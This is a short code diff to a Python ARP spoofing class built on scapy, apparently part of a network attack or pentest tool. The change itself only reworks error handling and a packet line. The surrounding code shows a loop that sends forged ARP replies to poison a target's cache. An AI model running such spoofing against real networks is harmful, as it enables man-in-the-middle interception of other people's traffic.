@@ -7,7 +7,8 @@ import scapy.all as scapy
 from scapy.arch import get_if_addr
 import netifaces as ni
 from threading import Thread
-
+import os
+import signal
 
 class ArpSpoofer:
     """
@@ -33,12 +34,12 @@ class ArpSpoofer:
         self.logger.debug(f"Target IP address: {targetIp}")
         self.logger.debug(f"Target MAC address: {self.targetMac}")
         if self.targetMac is None:
-            self.logger.error(f"ARP request for IP address {targetIp} failed! Target is not reachable!")
-            sys.exit(1)
+            self.logger.error(f"ARP request for IP address {targetIp} failed! Target is not reachable! Exiting...")
+            os.kill(os.getpid(), signal.SIGINT)
         else:
             while self.isRunning:
                 self.logger.debug(f"Tell target {targetIp} that spoofed IP address {spoofIp} is at our MAC address")
-                packet = scapy.ARP(op="is-at", pdst=targetIp, hwdst=self.targetMac, psrc=(spoofIp))
+                packet = scapy.ARP(op="is-at", pdst=targetIp, hwdst=self.targetMac, psrc=spoofIp)
                 scapy.send(packet, verbose=False)
                 time.sleep(1)
 
